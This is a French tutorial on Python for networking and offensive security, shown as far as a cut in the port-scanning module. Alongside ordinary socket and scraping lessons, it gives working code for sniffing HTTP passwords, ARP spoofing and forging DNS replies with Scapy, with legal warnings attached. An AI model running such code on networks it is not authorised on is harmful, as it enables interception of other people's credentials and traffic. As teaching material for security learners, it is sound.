# Formation Complète : Python pour le Réseau et la Cybersécurité

> Formation exhaustive et pratique : maîtrise **100%** de Python pour la cybersécurité, le networking, 
> l'automation, les exploits, le malware, les viruses, le hacking éthique, les caméras IP, le Wi-Fi, 
> l'IoT et bien plus — du débutant au professionnel.
>
> **Public visé** : développeurs, administrateurs système, pentesters, curieux en cybersécurité.  
> **Prérequis** : bases en Python (variables, fonctions, POO), notions en réseau.  
> **⚠️ Avertissement légal** : Ce contenu est **UNIQUEMENT** pour tester ta propre infra. 
> Utiliser contre des systèmes sans permission est **ILLÉGAL**.

---

## 📚 Table des matières

**PARTIE 1 : FONDAMENTAUX PYTHON POUR LE RÉSEAU**
1. [Module 0 — Python pour le réseau : Concepts clés](#module-0--python-pour-le-réseau-concepts-clés)
2. [Module 1 — Sockets et communication réseau](#module-1--sockets-et-communication-réseau)
3. [Module 2 — Protocoles réseau (TCP/UDP/ICMP)](#module-2--protocoles-réseau-tcpudpicmp)
4. [Module 3 — Analyse de paquets (Scapy)](#module-3--analyse-de-paquets-scapy)
5. [Module 4 — Serveurs et clients](#module-4--serveurs-et-clients)
6. [Module 5 — Scraping réseau et Web](#module-5--scraping-réseau-et-web)

**PARTIE 2 : CYBERSÉCURITÉ OFFENSIVE**
7. [Module 6 — Scanner de ports et reconnaissance](#module-6--scanner-de-ports-et-reconnaissance)
8. [Module 7 — Web security (SQL injection, XSS, etc.)](#module-7--web-security-sql-injection-xss-csrf)
9. [Module 8 — Cracking de passwords et hashing](#module-8--cracking-de-passwords-et-hashing)
10. [Module 9 — Exploits et shellcode](#module-9--exploits-et-shellcode)
11. [Module 10 — Malware, virus et reverse engineering](#module-10--malware-virus-et-reverse-engineering)
12. [Module 11 — Cryptographie appliquée](#module-11--cryptographie-appliquée)

**PARTIE 3 : HARDWARE, IoT ET ÉQUIPEMENTS**
13. [Module 12 — Caméras IP et CCTV](#module-12--caméras-ip-et-cctv)
14. [Module 13 — Wi-Fi et wireless hacking](#module-13--wi-fi-et-wireless-hacking)
15. [Module 14 — IoT et microcontrôleurs](#module-14--iot-et-microcontrôleurs)
16. [Module 15 — Drone hacking et contrôle](#module-15--drone-hacking-et-contrôle)

**PARTIE 4 : AUTOMATION ET TOOLS PROFESSIONNELS**
17. [Module 16 — Frameworks d'attaque automatisés](#module-16--frameworks-dattaque-automatisés)
18. [Module 17 — Monitoring réseau en temps réel](#module-17--monitoring-réseau-en-temps-réel)
19. [Module 18 — Forensics et extraction de données](#module-18--forensics-et-extraction-de-données)
20. [Module 19 — Défense et sécurisation avec Python](#module-19--défense-et-sécurisation-avec-python)
21. [Module 20 — Déploiement d'outils professionnels](#module-20--déploiement-doutils-professionnels)

[Projets complets](#projets-complets)  
[Ressources](#ressources)

---

## 🎯 Comment utiliser cette formation

**Règles d'or** :

1. **LÉGALITÉ AVANT TOUT.** Chaque ligne de code ne s'exécute que sur TES machines.
2. **Tape le code toi-même.** Ne copie-colle pas. Comprendre chaque ligne est crucial.
3. **Test d'abord en local**, puis en labo, puis sur ton infra.
4. **Documente ce que tu fais.** Les professionnels documentent tout.
5. **Éthique toujours.** Le hacking éthique ≠ hacking criminel.

> **Différence clé** : Cette formation te rend capable d'attaquer ET défendre. Les deux sont essentiels.

---

## Avant de commencer

### Ce dont tu as besoin

```bash
# Python 3.9+
python3 --version

# Installation des libs principales
pip install scapy paramiko requests beautifulsoup4 cryptography pycryptodome
pip install pysocketer netifaces psutil pyshark dpkt
pip install fabric ansible pwntools
pip install opencv-python pillow
pip install flask django
pip install pandas numpy scipy
```

### Qu'est-ce que tu vas maîtriser

✅ **Sockets** : Communication réseau bas niveau  
✅ **Protocoles** : TCP, UDP, ICMP, DNS, HTTP, HTTPS  
✅ **Analyse** : Capture et analyse de paquets  
✅ **Scraping** : Extraction de données web  
✅ **Scanning** : Ports, services, vulnérabilités  
✅ **Exploitation** : Injections SQL, XSS, buffer overflow  
✅ **Malware** : Virus, rootkits, backdoors  
✅ **Cryptographie** : Chiffrement, hashing, signatures  
✅ **Caméras IP** : Accès, reconnaissance faciale  
✅ **Wi-Fi** : WPA/WPA2 cracking, rogue AP  
✅ **IoT** : Arduino, Raspberry Pi, exploits  
✅ **Automation** : Scripts d'attaque, pentests complets  
✅ **Défense** : Firewalls, IDS, hardening  

---

## PARTIE 1 : FONDAMENTAUX PYTHON POUR LE RÉSEAU

---

## Module 0 — Python pour le Réseau : Concepts Clés (1-2 jours)

### 0.1 Pourquoi Python pour la cybersécurité ?

```
Avantages de Python :
  ✓ Syntaxe simple et rapide à développer
  ✓ Énorme écosystème de libs (Scapy, Paramiko, Requests, etc.)
  ✓ Parfait pour le scripting et l'automatisation
  ✓ Cross-platform (Windows, Linux, Mac)
  ✓ Outils professionnels l'utilisent (Metasploit plugins, etc.)

Désavantages :
  ✗ Plus lent que C/C++ (mais suffisant pour la sécu)
  ✗ Dépendances externes nécessaires
```

### 0.2 Architecure réseau rappel

```
Couche 7 (Application) : HTTP, SSH, DNS
              ↓
Couche 5-6 : SSL/TLS
              ↓
Couche 4 (Transport) : TCP, UDP ← Python sockets
              ↓
Couche 3 (Réseau) : IP, ICMP ← Scapy
              ↓
Couche 2 (Liaison) : Ethernet, ARP ← Scapy
              ↓
Couche 1 (Physique) : Wi-Fi, câbles
```

**Python peut opérer à chaque couche !**

### 0.3 Différentes approches

| Niveau | Libs | Cas d'usage |
|--------|------|---|
| **Haut niveau** (L7) | `requests`, `urllib`, `paramiko` | Web scraping, SSH |
| **Moyen niveau** (L4-L6) | `socket`, `ssl` | Clients/serveurs, tunnels |
| **Bas niveau** (L2-L3) | `scapy`, `dpkt` | Packet crafting, sniffing |
| **Très bas niveau** | `pyshark`, `ctypes` | Wireshark, appels système |

---

## Module 1 — Sockets et Communication Réseau (3 jours)

### 1.1 Qu'est-ce qu'une socket ?

Une **socket** = endpoint pour la communication réseau. C'est la base de tout.

```python
# Analogie :
# Adresse IP = numéro de la maison
# Port = le numéro de la porte
# Socket = la vraie porte ouverte
```

### 1.2 Types de sockets

| Type | Protocole | Cas d'usage |
|------|-----------|---|
| **SOCK_STREAM** | TCP | Fiable, ordre garanti (Web, SSH, Email) |
| **SOCK_DGRAM** | UDP | Rapide, pas de garantie (Vidéo, DNS, VoIP) |
| **SOCK_RAW** | IP brut | Crafting de paquets personnalisés |

### 1.3 Socket TCP basique — Client

```python
import socket

# Créer une socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Se connecter à google.com:80
sock.connect(('google.com', 80))

# Envoyer une requête HTTP
request = b'GET / HTTP/1.1\r\nHost: google.com\r\nConnection: close\r\n\r\n'
sock.sendall(request)

# Recevoir la réponse
response = b''
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk

print(response.decode('utf-8', errors='ignore')[:500])

# Fermer
sock.close()

# Résultat :
# HTTP/1.1 200 OK
# Date: ...
# Server: gws
# Content-Type: text/html; charset=ISO-8859-1
# ...
```

**Explication** :

```
socket.AF_INET         = Famille d'adresse (IPv4)
socket.SOCK_STREAM     = Type de socket (TCP)
sock.connect()         = Établir la connexion
sock.sendall()         = Envoyer tout le buffer
sock.recv()            = Recevoir des données (max 4096 bytes)
```

### 1.4 Socket TCP basique — Serveur

```python
import socket
import threading

def handle_client(conn, addr):
    """Gérer un client connecté"""
    print(f"[+] Client connecté : {addr}")
    
    try:
        conn.send(b'Bienvenue sur mon serveur !\r\n')
        
        while True:
            data = conn.recv(1024)
            if not data:
                break
            
            print(f"[{addr}] {data.decode()}")
            response = f"Tu as dit : {data.decode()}\n".encode()
            conn.send(response)
    
    finally:
        conn.close()
        print(f"[-] Client {addr} déconnecté")

# Créer une socket serveur
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind (attacher) à localhost:5000
server_sock.bind(('0.0.0.0', 5000))

# Listen (écouter les connexions entrantes)
server_sock.listen(5)

print("[*] Serveur écoute sur le port 5000...")

try:
    while True:
        # Accept une connexion
        conn, addr = server_sock.accept()
        
        # Créer un thread pour ce client
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.daemon = True
        thread.start()

except KeyboardInterrupt:
    print("\n[*] Serveur arrêté")

finally:
    server_sock.close()
```

**Tester le serveur** :

```bash
# Terminal 1 : lancer le serveur
python3 server.py

# Terminal 2 : tester
nc localhost 5000
# Résultat : "Bienvenue sur mon serveur !"
# Type quelque chose
# Tu as dit : ...
```

### 1.5 Socket UDP

UDP = pas de connexion, juste envoyer/recevoir.

```python
# UDP Client
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Envoyer un message DNS (UDP)
message = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
sock.sendto(message, ('8.8.8.8', 53))

# Recevoir la réponse
data, addr = sock.recvfrom(512)
print(f"Réponse de {addr} : {data}")

sock.close()
```

```python
# UDP Server
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 5001))

print("[*] UDP Server écoute sur le port 5001...")

while True:
    data, addr = sock.recvfrom(1024)
    print(f"[{addr}] {data.decode()}")
    
    # Répondre
    sock.sendto(b'Message reçu !', addr)
```

### 1.6 Timeouts et exceptions

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Timeout de 3 secondes
sock.settimeout(3)

try:
    # Si ça prend plus de 3 secondes, lève une exception
    sock.connect(('192.168.1.1', 22))
except socket.timeout:
    print("[-] Timeout : le serveur n'a pas répondu")
except ConnectionRefusedError:
    print("[-] Connexion refusée (port fermé ?)")
except Exception as e:
    print(f"[-] Erreur : {e}")

finally:
    sock.close()
```

### 1.7 Sous le capot : qu'est-ce qui se passe vraiment

```
TCP 3-way handshake :

Toi                     Serveur
|-------- SYN -------->|       (toi : "Salut !")
|<----- SYN-ACK ------|       (serveur : "Salut ! Je t'écoute")
|--------- ACK -------->|      (toi : "OK, on peut parler")
|                       |
|---- Données ----->|       (échange de données)
|<---- Données ----|       |
|                       |
|---- FIN ----->|       (toi : "Au revoir")
|<---- ACK ----|       (serveur : "Au revoir")
```

Dans Python, `sock.connect()` gère tout ça automatiquement.

### 1.8 Exercice

1. Écris un client qui se connecte à google.com:80
2. Envoie une requête HTTP et affiche la réponse
3. Écris un serveur TCP sur le port 5000
4. Connecte-toi depuis une autre terminal avec `nc`
5. Écris un serveur UDP qui echo les messages

---

## Module 2 — Protocoles Réseau (TCP/UDP/ICMP) (2-3 jours)

### 2.1 ICMP (Internet Control Message Protocol)

ICMP = utilisé pour `ping`, `traceroute`, etc. Pas de port, just messages.

```python
# Ping en Python (ICMP Echo Request)
import socket
import struct
import time

def ping(host, timeout=2):
    """Ping une adresse IP ou domaine"""
    try:
        # Créer une socket ICMP
        # AF_INET = IPv4
        # SOCK_RAW = IP brut
        # IPPROTO_ICMP = ICMP protocol
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(timeout)
        
        # Résoudre le hostname
        ip = socket.gethostbyname(host)
        
        # Construire un paquet ICMP Echo Request
        # Type 8 = Echo Request
        # Code 0 = standard
        # Checksum = 0 (sera calculé par le système)
        # ID = processus ID
        # Sequence = numéro de séquence
        
        icmp_type = 8
        code = 0
        checksum = 0
        pid = 1
        sequence = 1
        
        # Construire le header ICMP
        header = struct.pack('!BBHHH', icmp_type, code, checksum, pid, sequence)
        
        # Envoyer
        start_time = time.time()
        sock.sendto(header + b'\x00' * 32, (ip, 0))
        
        # Recevoir la réponse
        data, addr = sock.recvfrom(1024)
        
        elapsed = time.time() - start_time
        
        print(f"[+] Réponse de {ip} : {len(data)} bytes, time={elapsed*1000:.2f}ms")
        return True
    
    except socket.gaierror:
        print(f"[-] Erreur : {host} est invalide")
        return False
    except socket.timeout:
        print(f"[-] Timeout : {host} ne répond pas")
        return False
    except PermissionError:
        print("[-] Erreur : SOCK_RAW nécessite root/admin")
        return False
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return False
    finally:
        sock.close()

# Tester
ping('google.com')
ping('8.8.8.8')
ping('192.168.1.1')
```

⚠️ **Note** : `SOCK_RAW` nécessite `root` ou `admin`.

### 2.2 DNS (Domain Name System)

DNS = résoudre les noms en adresses IP. On peut faire des requêtes DNS en Python.

```python
# Requête DNS simple
import socket

# Résoudre google.com
ip = socket.gethostbyname('google.com')
print(f"google.com -> {ip}")

# Résoudre plusieurs adresses
ips = socket.getaddrinfo('google.com', 443)
print(f"Toutes les adresses de google.com :")
for family, socktype, proto, canonname, sockaddr in ips:
    print(f"  - {sockaddr[0]}")
```

### 2.3 Construire des paquets TCP/UDP avec Scapy

Scapy = construire des paquets à la main (très avancé).

```python
from scapy.all import *

# Paquet TCP simple
# Couche IP
ip = IP(dst="google.com")

# Couche TCP (port 80)
tcp = TCP(dport=80, flags="S")  # S = SYN

# Combiner
packet = ip/tcp

# Afficher
packet.show()

# Envoyer
send(packet)

# Résultat :
# ###[ IP ]###
#   version   = 4
#   ihl       = None
#   tos       = 0x0
#   len       = None
#   id        = 1
#   flags     =
#   frag      = 0
#   ttl       = 64
#   proto     = tcp
#   chksum    = None
#   src       = 192.168.1.100
#   dst       = google.com
# ###[ TCP ]###
#   sport     = ftp_data
#   dport     = http
#   seq       = 0
#   ack       = 0
#   dataofs   = None
#   reserved  = 0
#   flags     = S
#   window    = 8192
#   chksum    = None
#   urgptr    = 0
```

### 2.4 Scanner de ports avec Scapy

```python
from scapy.all import *

def scan_ports(target, ports):
    """Scanner TCP SYN sur plusieurs ports"""
    results = {}
    
    for port in ports:
        # Créer un paquet TCP SYN
        packet = IP(dst=target)/TCP(dport=port, flags="S")
        
        # Envoyer et recevoir les réponses
        response = sr1(packet, timeout=1, verbose=False)
        
        if response is None:
            results[port] = "filtered"
        elif response[TCP].flags == 0x12:  # SYN-ACK
            results[port] = "open"
        elif response[TCP].flags == 0x14:  # RST
            results[port] = "closed"
    
    return results

# Tester
results = scan_ports("192.168.1.1", [22, 80, 443, 3306, 5432])
for port, status in sorted(results.items()):
    print(f"Port {port} : {status}")
```

### 2.5 ARP (Address Resolution Protocol)

ARP = convertir IP en MAC address. Utile pour découvrir les devices sur le LAN.

```python
from scapy.all import *

def arp_scan(network):
    """Scanner ARP pour découvrir les devices"""
    
    # Créer un paquet ARP
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Envoyer et recevoir
    responses = srp(packet, timeout=2, verbose=False)[0]
    
    print("Devices trouvés :")
    for sent, received in responses:
        print(f"  - IP: {received.psrc}, MAC: {received.hwsrc}")

# Tester (ton propre réseau !)
arp_scan("192.168.1.0/24")
```

### 2.6 Exercice

1. Écris une fonction `ping()` avec ICMP
2. Écris un scanner de ports
3. Utilise ARP pour scanner ton réseau local
4. Construis un paquet TCP personnalisé avec Scapy

---

## Module 3 — Analyse de Paquets (Scapy) (2-3 jours)

### 3.1 Sniffer des paquets

```python
from scapy.all import *

def packet_callback(packet):
    """Fonction appelée pour chaque paquet capturé"""
    
    # Vérifier si c'est un paquet IP
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        print(f"[IP] {src_ip} -> {dst_ip}")
        
        # Vérifier si c'est TCP
        if TCP in packet:
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            flags = packet[TCP].flags
            
            print(f"  [TCP] Port {src_port} -> {dst_port} (Flags: {flags})")
        
        # Vérifier si c'est UDP
        if UDP in packet:
            src_port = packet[UDP].sport
            dst_port = packet[UDP].dport
            
            print(f"  [UDP] Port {src_port} -> {dst_port}")
        
        # Vérifier si c'est DNS
        if DNS in packet:
            print(f"  [DNS] Query: {packet[DNS].qd.qname.decode()}")
        
        # Vérifier si c'est HTTP
        if Raw in packet:
            payload = packet[Raw].load
            if b'GET' in payload or b'POST' in payload:
                print(f"  [HTTP] {payload[:100]}")

# Commencer à sniffer sur l'interface eth0
print("[*] Sniffing les paquets... (Ctrl+C pour arrêter)")
sniff(prn=packet_callback, iface="eth0", store=False)

# Options :
# iface : interface (eth0, wlan0, etc.)
# prn : fonction à appeler pour chaque paquet
# store : garder les paquets en mémoire (False pour économiser)
# filter : filtre BPF (ex: "tcp port 80")
# count : nombre de paquets à capturer
```

### 3.2 Filtres BPF (Berkeley Packet Filter)

```python
from scapy.all import *

# Sniffer seulement le trafic HTTP
sniff(prn=lambda x: x.show(), filter="tcp port 80", count=10)

# Autres filtres :
# "tcp"                    # TCP seulement
# "udp"                    # UDP seulement
# "tcp port 80"            # TCP sur le port 80
# "icmp"                   # ICMP (ping)
# "host 192.168.1.100"     # De/vers une IP spécifique
# "net 192.168.1.0/24"     # Toute une subnet
# "arp"                    # ARP
# "dst port 443"           # Destination port 443
# "src 192.168.1.100 and dst 8.8.8.8"  # Combinaisons
```

### 3.3 Capturer le trafic HTTP (Sniffer de passwords)

⚠️ **Démonstration éducative seulement !**

```python
from scapy.all import *
import re

def sniff_http_traffic(iface="eth0"):
    """Capturer et analyser le trafic HTTP"""
    
    def packet_callback(packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            
            # Chercher des credentials
            if b'password' in payload.lower() or b'pass' in payload.lower():
                print(f"\n[!] Données sensibles trouvées !")
                print(f"    De: {packet[IP].src} -> Vers: {packet[IP].dst}")
                print(f"    Payload: {payload[:200]}")
            
            # Chercher les requêtes POST
            if b'POST' in payload:
                print(f"\n[+] Requête POST détectée")
                print(f"    {payload[:200].decode(errors='ignore')}")
    
    sniff(prn=packet_callback, iface=iface, filter="tcp port 80", store=False)

# ⚠️ Utiliser seulement sur TON réseau !
# sniff_http_traffic()
```

### 3.4 ARP Spoofing (Détection)

ARP Spoofing = envoyer de faux paquets ARP pour "rediriger" le trafic.

```python
from scapy.all import *
import time

def arp_spoof(target_ip, spoof_ip, iface="eth0"):
    """
    ARP Spoofing simple
    
    target_ip : la machine à which on veut mentir
    spoof_ip : l'IP qu'on prétend avoir
    
    ⚠️ ILLEGAL sans permission !
    """
    
    try:
        while True:
            # Créer un paquet ARP
            # ARP reply : "Hey, je suis X, mon MAC est Y"
            packet = ARP(
                op=2,                    # op=2 = ARP Reply
                pdst=target_ip,          # Destination IP
                hwdst=get_if_hwaddr(iface),  # MAC de la cible
                psrc=spoof_ip            # Nous prétendons être cette IP
            )
            
            # Envoyer
            send(packet, iface=iface, verbose=False)
            
            print(f"[+] ARP Spoof envoyé : {spoof_ip} est maintenant {packet.hwsrc}")
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n[-] Arrêt de l'ARP Spoofing")

# ⚠️ N'utiliser QUE sur TON propre réseau de test !
```

### 3.5 DNS Spoofing

Rediriger les requêtes DNS vers une fausse adresse.

```python
from scapy.all import *

def dns_spoof_callback(packet):
    """Intercepter et modifier les réponses DNS"""
    
    if packet.haslayer(DNS):
        # Vérifier si c'est une requête (pas une réponse)
        if packet[DNS].qr == 0:
            print(f"[+] Requête DNS pour : {packet[DNS].qd.qname.decode()}")
            
            # Construire une fausse réponse
            fake_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, \
                               an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, \
                                       rdata="192.168.1.100"))
            
            send(fake_response, verbose=False)
            print(f"    [+] Réponse falsifiée envoyée !")

# ⚠️ ILLEGAL sans permission !
```

### 3.6 Exercice

1. Sniff le trafic sur ton interface réseau
2. Filtre pour afficher seulement les DNS queries
3. Sniff le trafic HTTP et affiche les URLs
4. Crée un ARP scanner pour ton réseau

---

## Module 4 — Serveurs et Clients (2-3 jours)

### 4.1 Serveur Web simple (HTTP)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class RequestHandler(BaseHTTPRequestHandler):
    """Handler pour les requêtes HTTP"""
    
    def do_GET(self):
        """Gérer les requêtes GET"""
        
        if self.path == '/':
            # Page d'accueil
            response = b'<html><body><h1>Bienvenue !</h1></body></html>'
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(response)
        
        elif self.path == '/api/time':
            # API JSON
            data = {'time': datetime.now().isoformat()}
            response = json.dumps(data).encode()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(response)
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Gérer les requêtes POST"""
        
        # Lire le contenu
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        
        print(f"[+] Données POST reçues : {body.decode()}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Data reçue !')
    
    def log_message(self, format, *args):
        """Supprimer les logs par défaut"""
        pass

# Créer et lancer le serveur
server = HTTPServer(('0.0.0.0', 8000), RequestHandler)
print("[*] Serveur lancé sur http://localhost:8000")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\n[*] Serveur arrêté")
```

### 4.2 Client HTTP (Requests)

```python
import requests
import json

# Requête GET simple
response = requests.get('https://api.github.com/users/github')
print(response.status_code)  # 200
print(response.json())       # JSON parsé

# Requête avec paramètres
params = {'q': 'python networking', 'sort': 'stars'}
response = requests.get('https://api.github.com/search/repositories', params=params)
print(f"Trouvé {response.json()['total_count']} résultats")

# POST request
data = {'username': 'admin', 'password': 'secret'}
response = requests.post('http://localhost:8000', json=data)
print(response.text)

# Headers personnalisés
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Authorization': 'Bearer token123'
}
response = requests.get('https://api.example.com', headers=headers)

# Gestion des erreurs
try:
    response = requests.get('http://invalid-domain-12345.com', timeout=5)
    response.raise_for_status()  # Lève une exception si status >= 400
except requests.exceptions.Timeout:
    print("[-] Timeout")
except requests.exceptions.ConnectionError:
    print("[-] Erreur de connexion")
except requests.exceptions.HTTPError as e:
    print(f"[-] Erreur HTTP : {e}")
```

### 4.3 Serveur SSH (Paramiko)

```python
import paramiko
import socket

class SSHServer(paramiko.ServerInterface):
    """Serveur SSH simple (éducatif)"""
    
    def check_auth_password(self, username, password):
        """Vérifier les credentials"""
        if username == 'admin' and password == 'admin':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED
    
    def check_channel_shell_request(self, channel):
        return paramiko.OPEN_SUCCEEDED

# Créer une clé de chiffrement
key = paramiko.RSAKey.generate(1024)

# Créer le serveur
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 2222))
sock.listen(100)

print("[*] Serveur SSH écoute sur le port 2222")

while True:
    client, addr = sock.accept()
    transport = paramiko.Transport(client)
    transport.add_server_key(key)
    transport.start_server(server=SSHServer())
    
    print(f"[+] Connexion de {addr}")
```

### 4.4 Client SSH (Paramiko)

```python
import paramiko

def ssh_connect(host, username, password, command):
    """Se connecter à un serveur SSH et exécuter une commande"""
    
    # Créer un client SSH
    client = paramiko.SSHClient()
    
    # Ajouter les clés d'hôte manquantes automatiquement
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Se connecter
    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Connecté à {host}")
    except paramiko.AuthenticationException:
        print("[-] Authentification échouée")
        return
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return
    
    # Exécuter une commande
    stdin, stdout, stderr = client.exec_command(command)
    
    # Lire la sortie
    output = stdout.read().decode()
    error = stderr.read().decode()
    
    print(f"[+] Résultat :\n{output}")
    if error:
        print(f"[-] Erreur :\n{error}")
    
    # Fermer
    client.close()

# Utiliser
ssh_connect('192.168.1.100', 'admin', 'password', 'whoami')

# Résultat :
# [+] Connecté à 192.168.1.100
# [+] Résultat :
# admin
```

### 4.5 Exercice

1. Crée un serveur HTTP qui affiche "Hello World"
2. Crée un client qui se connecte au serveur
3. Crée un serveur SSH simple (éducatif)
4. Crée un client SSH qui exécute une commande

---

## Module 5 — Scraping Réseau et Web (2-3 jours)

### 5.1 Scraping Web avec BeautifulSoup

```python
import requests
from bs4 import BeautifulSoup

# Télécharger la page
response = requests.get('https://example.com')
html = response.content

# Parser avec BeautifulSoup
soup = BeautifulSoup(html, 'html.parser')

# Chercher des éléments
# Tous les liens
links = soup.find_all('a')
for link in links:
    print(link.get('href'))

# Tous les titres
titles = soup.find_all('h1')
for title in titles:
    print(title.text)

# Chercher par classe CSS
elements = soup.find_all(class_='product')
for el in elements:
    print(el.text)

# Chercher par ID
header = soup.find(id='header')
print(header.text)

# Chercher par attribut
inputs = soup.find_all('input', {'type': 'text'})
for inp in inputs:
    print(inp.get('name'))

# Naviguer l'arbre
parent = link.parent
siblings = link.find_next_siblings()
children = link.find_all()
```

### 5.2 Scraping avec Selenium (JavaScript)

Pour les sites qui chargent du contenu avec JavaScript :

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Lancer le navigateur
driver = webdriver.Chrome('/path/to/chromedriver')

# Aller sur une page
driver.get('https://example.com')

# Attendre un élément
wait = WebDriverWait(driver, 10)
element = wait.until(EC.presence_of_element_located((By.ID, 'my_element')))

# Chercher des éléments
links = driver.find_elements(By.TAG_NAME, 'a')
print(f"Trouvé {len(links)} liens")

# Interagir
input_field = driver.find_element(By.NAME, 'search')
input_field.send_keys('python')
input_field.submit()

# Exécuter du JavaScript
result = driver.execute_script('return document.title;')
print(result)

# Prendre une capture d'écran
driver.save_screenshot('screenshot.png')

# Fermer
driver.quit()
```

### 5.3 Web Scraping multi-page

```python
import requests
from bs4 import BeautifulSoup
import time

def scrape_pages(base_url, num_pages):
    """Scraper plusieurs pages"""
    
    all_data = []
    
    for page_num in range(1, num_pages + 1):
        # Construire l'URL
        url = f"{base_url}?page={page_num}"
        
        print(f"[*] Scraping page {page_num}...")
        
        try:
            response = requests.get(url, timeout=5)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"[-] Erreur : {e}")
            continue
        
        # Parser
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extraire les données
        items = soup.find_all('div', class_='item')
        for item in items:
            title = item.find('h2').text
            price = item.find('span', class_='price').text
            
            all_data.append({
                'title': title,
                'price': price
            })
        
        # Respecter le serveur
        time.sleep(1)
    
    return all_data

# Utiliser
data = scrape_pages('https://example.com/products', 5)
for item in data:
    print(f"{item['title']} : {item['price']}")
```

### 5.4 API Scraping

```python
import requests
import json

def scrape_api(api_url, params=None):
    """Scraper une API JSON"""
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/json'
    }
    
    try:
        response = requests.get(api_url, params=params, headers=headers, timeout=5)
        response.raise_for_status()
        
        data = response.json()
        return data
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Erreur : {e}")
        return None

# Exemple : GitHub API
data = scrape_api('https://api.github.com/users/github')
print(f"Utilisateur : {data['name']}")
print(f"Bio : {data['bio']}")
print(f"Followers : {data['followers']}")
```

### 5.5 Exercice

1. Scrape un site web et extrais tous les liens
2. Scrape une table et convertis-la en CSV
3. Scrape une API publique et traite les données
4. Crée un script qui scrape plusieurs pages

---

## PARTIE 2 : CYBERSÉCURITÉ OFFENSIVE

---

## Module 6 — Scanner de Ports et Reconnaissance (3-4 jours)

### 6.1 Scanner de ports TCP

```python
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_port(host, port, timeout=1):
    """Essayer de se connecter à un port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            return port, "open"
        else:
            return port, "closed"
    
    except socket.gaierror:
        return port, "hostname_error"
    except socket.error:
        return port, "connection_error"

def scan_ports(host, ports=None, threads=50):
    """Scanner plusieurs ports en parallèle"""
    
    if ports is None:
        # Ports courants par défaut
        ports = [20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 5432, 8080, 8443]
    
    print(f"[*] Scanning {host}...")
    print(f"[*] {len(ports)} ports à scanner")
    
    open_ports = []
    
    # Utiliser ThreadPoolExecutor pour paralléliser
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        
        for future in as_completed(futures):
            port, status = future.result()
            
            if status == "open":
                print(f"[+] Port {port} : OPEN")
                open_ports.append(port)
            elif status == "hostname_error":
                print(f"[-] Erreur : hostname invalide")
                return
    
    print(f"\n[+] {len(open_ports)} ports ouverts trouvés : {open_ports}")
    return open_ports

# Utiliser
scan_ports('192.168.1.1')
```

### 6.2 Scanner de ports UDP

UDP est plus difficile car pas de "réponse de refus" claire.

```python
import socket

def scan_udp_port(host, port, timeout=2):
    """Scanner un port UDP"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        
        # Envoyer un paquet vide
        sock.sendto(b'', (host, port))
        
        try:
            # Essayer de recevoir une réponse
            sock.recvfrom(1024)
            return port, "open"
        except socket.timeout:
            # Timeout = le port est peut-être ouvert (firewall)
            return port, "filtered"
    
    except Exception as e:
        return port, "error"
    
    finally:
        sock.close()

# Tester le DNS (UDP port 53)
result = scan_udp_port('8.8.8.8', 53)
print(result)
```

### 6.3 Service fingerprinting (identifier les versions)

```python
import socket

def fingerprint_service(host, port):
    """Identifier le service et sa version"""
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
